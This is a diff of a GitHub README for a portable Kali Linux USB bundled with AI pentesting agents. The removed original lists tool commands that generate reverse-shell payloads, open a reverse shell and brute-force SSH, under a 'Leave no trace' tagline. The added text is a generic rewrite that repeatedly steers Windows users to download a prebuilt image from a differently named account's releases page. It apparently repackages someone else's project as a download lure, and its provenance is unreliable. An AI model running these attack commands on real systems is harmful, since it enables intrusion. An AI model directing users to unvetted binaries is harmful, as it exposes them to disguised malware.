@@ -1,316 +1,252 @@
-# 🗡️ Kali + OpenCode Portable Pentest USB
+# 🔒 kali-opencode-usb - Boot Kali Anywhere, Run Smart Tests
 
-> **Boot anywhere. Pentest everything. Leave no trace.**
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/glottochronological-gynura119/kali-opencode-usb/releases)
 
-A bootable USB drive combining **Kali Linux Live** with **AI-powered pentesting tools**: OpenCode, CLI Agent, Kali MCP, and Shannon Plugin for autonomous penetration testing.
+## 🧭 What this is
 
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Kali](https://img.shields.io/badge/Kali-2025.1-blue)](https://kali.org)
-[![OpenCode](https://img.shields.io/badge/OpenCode-latest-green)](https://opencode.ai)
-[![CLI Agent](https://img.shields.io/badge/CLI%20Agent-v1.2.6-orange)](https://github.com/amranu/cli-agent)
-[![Kali MCP](https://img.shields.io/badge/Kali%20MCP-35%2B%20tools-red)](https://github.com/k3nn3dy-ai/kali-mcp)
-[![Shannon](https://img.shields.io/badge/Shannon-Plugin-blue)](https://github.com/vichhka-git/opencode-shannon-plugin)
+kali-opencode-usb is a bootable Kali Linux USB for security testing. It is built to run from a USB drive, so you can start the system on a Windows PC without installing it on the hard drive.
 
----
+It includes tools for command line testing, AI help, and portable use. The goal is simple: boot from USB, run your tools, and keep the main system unchanged.
 
-## 🔥 Why This Exists
+## 💾 Download the USB build
 
-Traditional pentesting workflow problems:
+Visit this page to download the latest release:
 
-| Problem | This Solution |
-|---------|---------------|
-| Tools scattered across machines | Single USB, everything pre-configured |
-| Manual, repetitive recon workflows | AI tools automate workflows |
-| Forgetting to document findings | Auto-documentation and reports |
-| Leaving traces on client systems | Boot Live USB, nothing touches host disk |
-| API dependency for AI tools | CLI Agent + Ollama work offline |
-| Learning curve for tools | Kali MCP + Shannon expose tools via AI |
-| Complex multi-stage attacks | Shannon handles autonomous pentesting |
+https://github.com/glottochronological-gynura119/kali-opencode-usb/releases
 
----
+Open the latest release and download the file that matches your USB image or installer package. Save it to your Windows PC before you write it to a USB drive.
 
-## 📦 What You Get
+## 🪟 What you need on Windows
 
-- **Full Kali Linux** - Every pentest tool (nmap, metasploit, burp, hashcat, etc.)
-- **OpenCode** - Modern AI CLI with plugins, MCP support, web UI
-- **CLI Agent** - Lightweight AI agent with local Ollama model support
-- **Kali MCP** - 35+ security tools as MCP tools
-- **Shannon Plugin** - Autonomous pentesting with 600+ Docker tools + browser automation
-- **Persistence** - Your configs, workflows, and findings survive reboots
-- **Forensically Clean** - Remove USB, no trace on host (RAM only)
+Before you start, make sure you have:
 
----
+- A Windows PC
+- A USB drive with at least 16 GB of space
+- A second USB drive if you want to keep one drive clean for files
+- A stable internet connection
+- An empty drive or a drive that you can erase
+- A tool to write the image to USB, such as Rufus or balenaEtcher
 
-## 🤖 AI Tool Suite
+For best results, use a USB 3.0 drive. It loads faster and gives a smoother boot.
 
-### OpenCode (Cloud + Local)
+## ⚙️ How to make the bootable USB
 
-```bash
-opencode          # Start TUI
-opencode web      # Start web interface
-```
+1. Open the release page and download the latest USB image.
+2. Insert your USB drive into the Windows PC.
+3. Open your USB writing tool.
+4. Select the downloaded file.
+5. Pick the correct USB drive.
+6. Start the write process.
+7. Wait until it finishes.
+8. Safely remove the USB drive.
 
-**Features:** TUI, web interface, MCP, plugins, multi-agent, GitHub integration
+If the tool asks to erase the USB drive, confirm it only after you check that you picked the right drive.
 
-### CLI Agent (Local-First)
+## 🚀 How to boot from the USB
 
-```bash
-agent chat                              # Cloud API
-agent chat --model ollama:llama3        # Offline with Ollama
-```
+1. Insert the USB drive into the target computer.
+2. Restart the computer.
+3. Open the boot menu during startup.
+4. Choose the USB drive.
+5. Wait for Kali Linux to load.
 
-### Kali MCP (35+ Security Tools)
+The boot key depends on the computer brand. Common keys are F12, F9, Esc, or Del.
 
-```
-/port_scan target=192.168.1.1 scan_type=quick
-/dns_enum domain=example.com
-/hydra_attack target=10.0.0.1 service=ssh
-```
+If the computer starts Windows instead, restart and try the boot menu key again.
 
-### Shannon Plugin (Autonomous Pentesting)
+## 🛠️ First start setup
 
-```bash
-/shannon-scan target=example.com        # Full autonomous pentest
-/shannon-recon target=example.com      # Reconnaissance only
-/shannon-report                        # Generate professional report
-```
+When Kali starts, you may see a desktop with a menu, terminal, and tool shortcuts.
 
-**Shannon Tools:**
-| Tool | Purpose |
-|------|---------|
-| `shannon_docker_init` | Start Docker container |
-| `shannon_recon` | Recon (nmap, subfinder, whatweb) |
-| `shannon_vuln_discovery` | Vulnerability scanning |
-| `shannon_browser` | Playwright browser testing |
-| `shannon_exploit` | Exploitation (authorized) |
-| `shannon_report` | Generate professional reports |
-| `shannon_idor_test` | IDOR vulnerability testing |
-| `shannon_upload_test` | File upload testing |
+Do these steps first:
 
-**Shannon Bundled Tools:** nmap, sqlmap, nikto, nuclei, gobuster, ffuf, hydra, hashcat, gowitness, BrowserBruter, Playwright
+1. Check that the keyboard and mouse work.
+2. Connect to Wi-Fi or Ethernet if needed.
+3. Open the menu and look for security tools.
+4. Open the terminal if you want the command line tools.
+5. If you use AI features, make sure the local model service is active.
 
----
+This build is meant to run from USB, so most changes stay on the drive and do not touch the Windows system.
 
-## 🚀 Quick Start
+## 🤖 Core tools included
 
-### Build the USB
+This project brings together several parts in one portable setup:
 
-```bash
-git clone https://github.com/Adarsh1Y/kali-opencode-usb.git
-cd kali-opencode-usb
-sudo ./build-usb.sh /dev/sdX
-# Wait 10-20 minutes (downloads ~3GB Kali ISO)
-```
+- OpenCode for AI-guided command line work
+- CLI agent support for text-based tasks
+- Kali MCP with 35+ tools for security workflows
+- Shannon Plugin for autonomous testing
+- Docker-based tool support for 600+ security tools
+- Portable Kali Linux boot support
 
-### Boot
+These tools help with scans, checks, and test workflows from a single USB setup.
 
-1. Plug USB into target machine
-2. Boot from USB (F12/Del/Esc for boot menu)
-3. Select **"Live USB Persistence"**
-4. Login: `kali` / `kali`
+## 🧪 What you can do with it
 
-### First Boot Setup
+Use this USB build for common security tasks such as:
 
-```bash
-sudo bash ~/opencode-setup.sh
-```
+- Checking a lab or test system
+- Running network scans
+- Reviewing exposed services
+- Testing web apps in a controlled setup
+- Trying Docker-based tools without a full install
+- Using AI help to guide command line work
+- Keeping your main Windows system separate from the test environment
 
-This installs:
-- OpenCode
-- CLI Agent
+Use it only on systems you own or have permission to test.
+
+## 📁 Folder and file layout
+
+After you boot the USB, you may see files and folders like these:
+
+- System files for Kali Linux
+- Tool folders for command line apps
+- Docker data and images
+- Settings for AI and agent tools
+- Persistent storage files if enabled
+
+If you use persistence, the USB can keep your changes after reboot.
+
+## 🔐 Typical setup options
+
+Many users choose one of these setups:
+
+- Live mode: boots fast and resets on reboot
+- Persistent mode: saves files and settings on the USB
+- Mixed mode: keeps some tools ready and stores selected changes
+
+If you are new to bootable Linux USB drives, start with live mode first.
+
+## 🧰 Basic usage tips
+
+- Keep the USB drive plugged in while the system runs
+- Do not remove it during boot or shutdown
+- Use a USB 3.0 port if your PC has one
+- Close unused tools to keep the system responsive
+- Store test notes on a second drive or cloud folder if needed
+- Reboot if a tool does not start as expected
+
+## 🖥️ Windows boot troubleshooting
+
+If the USB does not boot on Windows hardware, check these common points:
+
+- Use the correct boot menu key for the PC
+- Try a different USB port
+- Try a different USB drive
+- Recreate the USB image
+- Turn off Fast Startup in Windows if the drive is not seen
+- Check BIOS or UEFI settings for USB boot support
+
+Some systems need Secure Boot changes before they will boot a Linux USB.
+
+## 🧩 AI and agent features
+
+This build includes AI-assisted testing tools that help you work from the command line. These features can help with:
+
+- Simple task guidance
+- Repeated test steps
+- Tool selection
+- Output review
+- Workflow control across several tools
+
+The aim is to reduce manual steps while keeping you in control of the test session.
+
+## 🐳 Docker tool support
+
+The project also supports Docker-based security tools. That gives you a way to run a large set of tools from a known setup without a full install on the host system.
+
+This is useful when you want:
+
+- A clean test environment
+- Fast tool setup
+- Easy tool changes
+- A portable workflow on USB
+
+## 📦 Release files
+
+The release page may include items such as:
+
+- A bootable image file
+- A checksum file
+- A readme or usage note
+- Support files for USB writing tools
+
+If checksum files are present, use them to confirm the download before writing it to the USB drive.
+
+## 🧭 Simple first run flow
+
+1. Download the latest release.
+2. Write it to a USB drive.
+3. Boot a PC from the USB.
+4. Open the desktop or terminal.
+5. Run the tools you need.
+6. Save changes only if you use persistence.
+
+That is the basic path from download to first use
+
+## 🧹 Keeping things clean
+
+Because this runs from USB, it helps keep the main computer separate from the test system. That makes it useful for:
+
+- Lab work
+- Temporary test setups
+- Shared computers
+- Travel use
+- Short-term security checks
+
+When you are done, shut down, remove the USB, and the Windows system stays as it was
+
+## 📌 Supported topics
+
+This project fits these areas:
+
+- automation
+- autonomous pentesting
+- cybersecurity
+- docker security
+- Kali Linux
 - Kali MCP
-- Ollama (optional)
+- MCP
+- Ollama
+- OpenCode
+- penetration testing
+- pentest
+- portable
+- red team
+- security automation
+- security tools
+- Shannon
+- USB
 
----
+## 🧱 Who this is for
 
-## 📁 Repository Structure
+This USB build is a good fit if you want:
 
-```
-kali-opencode-usb/
-├── build-usb.sh              # USB builder script
-├── kali-mcp/                 # Kali MCP Server (35+ tools)
-│   ├── kali_mcp_server/      # MCP tools implementation
-│   ├── Dockerfile            # Docker container
-│   └── README.md             # Kali MCP docs
-├── opencode-shannon-plugin/   # Shannon Plugin (autonomous pentest)
-│   ├── src/                  # Plugin source code
-│   ├── Dockerfile             # Shannon Docker tools
-│   └── README.md             # Shannon docs
-├── cli-agent/                # CLI Agent (from ~/cli-agent)
-├── postinstall/
-│   ├── opencode-setup.sh     # First-boot setup
-│   └── README-OPENCODE.txt   # Quick reference
-├── scripts/
-│   ├── backup-config.sh
-│   └── deploy-node.sh
-└── docs/
-    ├── USAGE.md
-    └── SECURITY.md
-```
+- A portable Kali Linux setup
+- A way to boot without installing on Windows
+- AI help during testing tasks
+- Docker-based security tools in one place
+- A clean test environment on the go
 
----
+## 🔎 Common questions
 
-## 🔧 MCP Configuration
+**Does it replace Windows?**  
+No. It boots from USB and leaves Windows in place.
 
-OpenCode is pre-configured with MCP servers and plugins:
+**Do I need coding experience?**  
+No. You only need to download the release, write it to USB, and boot from it.
 
-```jsonc
-// ~/.config/opencode/opencode.jsonc
-{
-  "mcp": {
-    "cli-agent": {
-      "type": "local",
-      "command": ["~/cli-agent/.venv/bin/python", "~/cli-agent/mcp_server.py"],
-      "enabled": true
-    },
-    "kali-mcp": {
-      "type": "local",
-      "command": ["~/kali-mcp/.venv/bin/python", "-m", "kali_mcp_server"],
-      "enabled": true
-    }
-  },
-  "plugin": [
-    "~/opencode-shannon-plugin"
-  ]
-}
-```
+**Can I use it on any PC?**  
+It works on many modern PCs that support USB boot.
 
----
+**Can it save my work?**  
+Yes, if you use persistence.
 
-## 🛠️ Kali MCP Tools (35+)
+**Can I use it without internet?**  
+Yes for local tools. Some features may work better with internet access
 
-### Network Tools
-```bash
-/port_scan target=192.168.1.1 scan_type=full
-/network_discovery target=192.168.1.0/24 discovery_type=comprehensive
-/dns_enum domain=example.com record_types=a,mx,ns,txt
-/subdomain_enum url=https://example.com
-```
+## 🧭 Start here
 
-### Web Application
-```bash
-/web_enumeration target=http://example.com enumeration_type=full
-/vulnerability_scan target=example.com scan_type=comprehensive
-/spider_website url=https://example.com depth=3
-/header_analysis url=https://example.com
-/ssl_analysis url=https://example.com port=443
-```
+Download the latest release, write it to a USB drive, and boot a Windows PC from that drive
 
-### Exploitation
-```bash
-/exploit_search search_term="apache 2.4" search_type=web
-/payload_generate payload_type=reverse_shell platform=linux lhost=YOUR_IP lport=4444 format=elf
-/reverse_shell lhost=YOUR_IP shell_type=bash lport=4444
-```
-
-### Credentials
-```bash
-/hydra_attack target=192.168.1.1 service=ssh username=admin passlist=/usr/share/wordlists/rockyou.txt
-/hash_identify hash_value=5d41402abc4b2a76b9719d911017c592
-/encode_decode data="hello" operation=encode format=base64
-```
-
-### Session Management
-```bash
-/session_create session_name="client-audit" description="Q1 audit" target=example.com
-/session_list
-/session_switch session_name="client-audit"
-/session_status
-```
-
-### Reporting
-```bash
-/create_report title="Security Assessment" findings="..." report_type=markdown
-/save_output content="..." filename="notes" category="general"
-/file_analysis filepath=/path/to/file
-```
-
----
-
-## 🏗️ Architecture
-
-```
-┌─────────────────────────────────────────────────────────┐
-│                    USB Drive                            │
-├─────────────────────────────────────────────────────────┤
-│    [EFI Boot]  - Kali bootloader                        │
-│    [Live ISO]  - Read-only Kali base system             │
-│    [Persist]   - /home/kali/                            │
-│      ├── .opencode/        - OpenCode config            │
-│      ├── .config/opencode/ - MCP + Plugin config        │
-│      ├── cli-agent/        - CLI Agent                  │
-│      ├── kali-mcp/         - Kali MCP Server            │
-│      ├── opencode-shannon/ - Shannon Plugin             │
-│      └── shannon-tools     - Docker image (600+ tools)  │
-└─────────────────────────────────────────────────────────┘
-                           │
-                           │ Boot on any x64 machine
-                           ▼
-┌─────────────────────────────────────────────────────┐
-│              Your Portable Pentest Rig              │
-│  • Full Kali toolset                                │
-│  • OpenCode (cloud AI + orchestration)              │
-│  • CLI Agent (offline AI with Ollama)               │
-│  • Kali MCP (35+ security tools)                    │
-│  • Shannon (autonomous pentesting)                  │
-│  • Nothing touches host disk                        │
-└─────────────────────────────────────────────────────┘
-
-┌───────────────────────────────────────────────────────┐
-│                    USB Drive                          │
-├───────────────────────────────────────────────────────┤
-│  [EFI Boot]  - Kali bootloader                        │
-│  [Live ISO]  - Read-only Kali base system             │
-│  [Persist]   - /home/kali/                            │
-│     ├── .opencode/        - OpenCode config           │
-│     ├── .config/opencode/ - MCP servers config        │
-│     ├── cli-agent/        - CLI Agent                 │
-│     ├── kali-mcp/         - Kali MCP Server           │
-│     └── .openclaw/        - Ollama models (optional)  │
-└───────────────────────────────────────────────────────┘
-                           │
-                           │ Boot on any x64 machine
-                           ▼
-┌───────────────────────────────────────────────────────┐
-│              Your Portable Pentest Rig                │
-│  • Full Kali toolset                                  │
-│  • OpenCode (cloud AI + orchestration)                │
-│  • CLI Agent (offline AI with Ollama)                 │
-│  • Kali MCP (35+ security tools via AI)               │
-│  • Nothing touches host disk                          │
-└───────────────────────────────────────────────────────┘
-
-
----
-
-## 🔐 Security Considerations
-
-> ⚠️ **Only test systems you have written authorization to test.**
-
-- Encrypt persistence partition for sensitive engagements
-- Never leave USB unattended
-- Use VPN for remote connections
-- Document all authorization in memory files
-
----
-
-## 🙏 Credits
-
-Built with:
-- **[Kali Linux](https://kali.org)** - Penetration testing distribution
-- **[OpenCode](https://opencode.ai)** - Modern AI CLI
-- **[CLI Agent](https://github.com/amranu/cli-agent)** - MCP-enabled AI assistant
-- **[Kali MCP](https://github.com/k3nn3dy-ai/kali-mcp)** - 35+ security tools via MCP
-- **[Shannon Plugin](https://github.com/vichhka-git/opencode-shannon-plugin)** - Autonomous pentesting
-- **[Ollama](https://ollama.com)** - Local AI runtime
-
----
-
-## 📬 Contact
-
-- **GitHub:** [@Adarsh1Y](https://github.com/Adarsh1Y)
-- **Discord:** [OpenCode Community](https://discord.gg/opencode)
-
----
-
-> **Disclaimer:** This tool is for authorized security testing only.
+[![Get the latest release](https://img.shields.io/badge/Get%20the%20latest%20release-Visit%20Releases-grey?style=for-the-badge&logo=github)](https://github.com/glottochronological-gynura119/kali-opencode-usb/releases)
